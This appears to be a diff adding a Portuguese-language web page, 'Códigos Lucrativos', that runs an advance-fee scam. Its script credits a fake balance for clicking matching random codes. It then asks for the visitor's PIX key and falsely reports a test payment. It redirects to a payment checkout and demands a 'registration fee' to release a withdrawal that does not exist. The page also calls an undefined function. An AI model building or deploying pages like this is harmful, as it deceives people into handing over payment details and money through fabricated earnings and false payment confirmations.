@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Códigos Lucrativos</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+<style>
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background-color: #f2f2f2;
+  }
+  header {
+    background-color: black;
+    color: white;
+    padding: 10px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  #saldo {
+    background-color: green;
+    padding: 5px 10px;
+    border-radius: 5px;
+  }
+  main {
+    background-color: white;
+    padding: 20px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    border-radius: 10px;
+    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+    margin-top: 20px;
+  }
+  #logo {
+    font-size: 60px;
+    margin-bottom: 20px;
+  }
+  #codigo-gerado {
+    font-size: 18px;
+    margin-bottom: 20px;
+  }
+  #codes-container {
+    margin-bottom: 20px;
+    display: flex;
+    justify-content: center;
+  }
+  .codigo {
+    background-color: #ddd;
+    padding: 10px;
+    margin: 0 5px;
+    cursor: pointer;
+    border-radius: 5px;
+    transition: background-color 0.3s;
+  }
+  .codigo:hover {
+    background-color: #ccc;
+  }
+  .selecionado {
+    background-color: #ccc;
+  }
+  #submit-btn {
+    padding: 10px 20px;
+    background-color: blue;
+    color: white;
+    border: none;
+    cursor: pointer;
+    border-radius: 5px;
+  }
+</style>
+</head>
+<body>
+<header>
+  <div>Códigos Lucrativos</div>
+  <div id="saldo">R$ <span id="saldo-valor">0,00</span></div>
+</header>
+<main>
+  <i id="logo" class="fas fa-coins"></i>
+  <div>Código gerado com sucesso:</div>
+  <div id="codigo-gerado"></div>
+  <div id="codes-container">
+    <div class="codigo" id="codigo-errado"></div>
+    <div class="codigo" id="codigo-certo"></div>
+  </div>
+  <div id="opcoes-chave-pix" style="display: none;">
+    <div>CADASTRE SUA CHAVE PIX.</div>
+    <div>Vamos te enviar um PIX TESTE de R$0,10 centavos para confirmar se está tudo certo. Selecione sua chave pix:</div>
+    <select id="chave-pix">
+      <option value="Celular">Celular</option>
+      <option value="CNPJ/CPF">CNPJ/CPF</option>
+    </select>
+    <input type="text" id="chave-input" placeholder="Digite sua chave PIX">
+    <button id="submit-chave">Enviar</button>
+  </div>
+  <button id="submit-btn">Enviar</button>
+</main>
+
+<script>
+  function gerarCodigoAleatorio() {
+    const caracteres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let codigo = '';
+    for (let i = 0; i < 8; i++) {
+      codigo += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
+    }
+    return codigo;
+  }
+
+  let selecionado = null;
+  
+  function selecionarCodigo(elemento) {
+    if (selecionado) {
+      selecionado.classList.remove('selecionado');
+    }
+    selecionado = elemento;
+    selecionado.classList.add('selecionado');
+  }
+  
+  // Logos e códigos dinâmicos
+  let saldo = 0;
+  let currentIndex = 0;
+  
+  function atualizarSaldo(valor) {
+    saldo += valor;
+    document.getElementById('saldo-valor').textContent = saldo.toFixed(2);
+    if (saldo >= 207) {
+      document.getElementById('codigo-gerado').textContent = "Antes de realizar seu 1º saque";
+      document.getElementById('codes-container').innerHTML = `
+        <div id="opcoes-chave-pix">
+          <div>CADASTRE SUA CHAVE PIX.</div>
+          <div>Vamos te enviar um PIX TESTE de R$0,10 centavos para confirmar se está tudo certo. Selecione sua chave pix:</div>
+          <select id="chave-pix">
+            <option value="Celular">Celular</option>
+            <option value="CNPJ/CPF">CNPJ/CPF</option>
+          </select>
+          <input type="text" id="chave-input" placeholder="Digite sua chave PIX">
+          <button id="submit-chave">Enviar</button>
+        </div>
+      `;
+      document.getElementById('opcoes-chave-pix').style.display = 'block';
+      document.getElementById('submit-chave').addEventListener('click', cadastrarChavePix);
+    }
+  }
+  
+  function cadastrarChavePix() {
+    // Simulação do cadastro da chave PIX
+    alert("Chave PIX cadastrada com sucesso!\n\nVocê recebeu o seu saque teste de 10 CENTAVOS em nome de 'SUITPAY'. Verifique suas notificações ou extrato bancário!\n\nAgora basta realizar mais 4 confirmações de códigos para realizar seu 1º saque!");
+    // Redirecionar para a URL após o envio da chave PIX
+    window.location.href = "https://checkout.perfectpay.com.br/pay/PPU38CNLQPP";
+  }
+  
+  function gerarCodigo() {
+    const codigo = gerarCodigoAleatorio();
+    document.getElementById('codigo-gerado').textContent = codigo;
+    document.getElementById('codigo-errado').textContent = gerarCodigoAleatorio();
+    document.getElementById('codigo-certo').textContent = codigo;
+  }
+  
+  function iniciar() {
+    gerarCodigo();
+    
+    document.querySelectorAll('.codigo').forEach(function(codigo) {
+      codigo.addEventListener('click', function() {
+        selecionarCodigo(codigo);
+      });
+    });
+    
+    document.getElementById('submit-btn').addEventListener('click', function() {
+      if (!selecionado) {
+        alert("Por favor, selecione um código.");
+        return;
+      }
+      if (selecionado.id === 'codigo-errado') {
+        alert("Código escolhido é o errado.");
+        return;
+      }
+      alert(`Saldo atualizado!\
+      \n\nVocê recebeu:\nR$ 69,00\npelo código ${document.getElementById('codigo-gerado').textContent}`);
+      atualizarSaldo(69);
+      gerarCodigo();
+    });
+
+    document.getElementById('submit-chave').addEventListener('click', function() {
+      cadastrarChavePix();
+      setTimeout(function() {
+        alert("O seu saque já está QUASE finalizado!\n\nPara continuar lucrando dentro do aplicativo e finalizar seu saque de R$483 reais agora!\n\nPague apenas uma taxa de cadastro.\n\nMas fique tranquilo, você receberá esse valor na sua conta após o saque!");
+        enviarChavePIX(); // Redirecionar após o envio da chave PIX
+      }, 1000);
+    });
+  }
+
+  iniciar();
+</script>
+</body>
+</html>
